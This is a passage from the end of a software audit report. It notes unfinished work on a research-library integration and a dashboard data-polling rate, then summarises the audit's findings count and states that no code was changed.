5. The **`lib/deep-research-group.js` actual integration** — D7 fix is multi-day work. Consider whether "research" is a real product or a feature label.
6. The **`useMissionData` poll rate** — currently 5-10s on the central truth endpoint. With 21 ports, even with parallel probes, this is 200-500ms. If it grows to 1s+, the megapanel becomes unusable.

---

**End of audit. 4 parallel deep-dives, 138+ findings, 13 critical-ship-blocker items, 4 hours of code work to ship a clean version. The rest is sprint 2.**

**No code modified. All findings are evidence-cited.**
